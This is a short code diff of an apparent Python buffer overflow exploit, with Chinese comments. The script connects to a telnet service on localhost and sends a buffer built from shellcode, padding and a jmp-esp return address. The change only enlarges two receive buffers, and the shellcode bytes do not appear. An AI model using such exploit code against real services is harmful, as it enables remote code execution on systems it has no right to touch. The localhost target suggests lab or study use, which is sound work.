@@ -3,7 +3,7 @@ import os
  
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock.connect(('127.0.0.1',23))  #telnet用的是23端口
-s = sock.recv(2022)   # 设置接受对方发送的数据字节数量
+s = sock.recv(4096)   # 设置接受对方发送的数据字节数量
 print(s)
 
 # 构造shellcode
@@ -20,5 +20,5 @@ sendStr = sendStr+jmp+shellcode+padding+jmpesp +b'a'*16
 
 sock.send(sendStr)                         #发送shellcode
 sock.send(b'\n')
-s = sock.recv(2022)
+s = sock.recv(4096)
 print(s)
